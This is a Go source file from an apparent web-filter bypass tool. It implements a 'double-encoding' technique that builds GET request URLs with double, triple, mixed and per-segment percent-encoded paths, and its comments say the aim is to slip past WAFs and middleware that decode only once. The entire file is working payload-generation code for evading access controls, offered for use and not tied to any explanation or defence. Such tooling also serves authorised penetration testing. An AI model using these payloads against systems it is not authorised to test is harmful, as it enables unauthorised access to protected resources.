package bypass

import (
	"fmt"
	"strings"
)

// DoubleEncodingTechnique applies various levels of percent-encoding to path
// characters to bypass WAFs and middleware that only decode one layer.
type DoubleEncodingTechnique struct{}

// Name returns the technique identifier.
func (t *DoubleEncodingTechnique) Name() string { return "double-encoding" }

// Description returns a human-readable summary.
func (t *DoubleEncodingTechnique) Description() string {
	return "Double/triple percent-encode path separators and dots to bypass single-decode filters"
}

// doubleEncode encodes a single character as its double-encoded form.
// '/' → %2F → %252F, '.' → %2E → %252E.
// Characters that are not '/' or '.' are returned unchanged.
func doubleEncode(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 6)
	for _, r := range s {
		switch r {
		case '/':
			b.WriteString("%252F")
		case '.':
			b.WriteString("%252E")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// doubleEncodePath takes a URL path and double-encodes '/' and '.' characters
// while preserving the rest of the path. Multi-byte runes are safely passed through.
func doubleEncodePath(path string) string {
	return doubleEncode(path)
}

// tripleEncode encodes '/' and '.' with three layers of encoding.
// '/' → %2F → %252F → %25252F
func tripleEncode(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 8)
	for _, r := range s {
		switch r {
		case '/':
			b.WriteString("%25252F")
		case '.':
			b.WriteString("%25252E")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// fullDoubleEncode percent-encodes every byte of s, then encodes the '%' signs
// in the result as %25 — effectively double-encoding the whole string.
func fullDoubleEncode(s string) string {
	return doublePercentEncode(s)
}

// mixedEncode applies double-encoding to '/' but single-encoding to '.'.
func mixedEncode(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 6)
	for _, r := range s {
		switch r {
		case '/':
			b.WriteString("%252F")
		case '.':
			b.WriteString("%2E")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// mixedEncodeReverse applies single-encoding to '/' but double-encoding to '.'.
func mixedEncodeReverse(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 6)
	for _, r := range s {
		switch r {
		case '/':
			b.WriteString("%2F")
		case '.':
			b.WriteString("%252E")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// Generate produces double/triple/mixed encoding payloads for the target.
func (t *DoubleEncodingTechnique) Generate(target *Target) []Payload {
	path := target.Path
	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	base := target.BaseURL()

	type variant struct {
		label   string
		encoded string
	}

	variants := []variant{
		{"double-encode / and .", doubleEncodePath(path)},
		{"full double-encode all bytes", fullDoubleEncode(path)},
		{"triple-encode / and .", tripleEncode(path)},
		{"mixed: double-encode /, single-encode .", mixedEncode(path)},
		{"mixed: single-encode /, double-encode .", mixedEncodeReverse(path)},
	}

	// Per-segment double-encoding: encode each segment individually
	// while leaving separators intact.
	for i, seg := range target.Segments {
		encoded := doublePercentEncode(seg)
		mutated := replaceSeg(target.Segments, i, encoded)
		p := strings.Join(mutated, "/")
		desc := fmt.Sprintf("double-encode segment %d (%s)", i, seg)
		variants = append(variants, variant{desc, p})
	}

	payloads := make([]Payload, 0, len(variants))
	for _, v := range variants {
		fullURL := base + "/" + v.encoded
		desc := fmt.Sprintf("double-encoding: %s", v.label)
		payloads = append(payloads, makeRawPayload(
			t.Name(), desc, "GET", fullURL, nil,
		))
	}

	return payloads
}
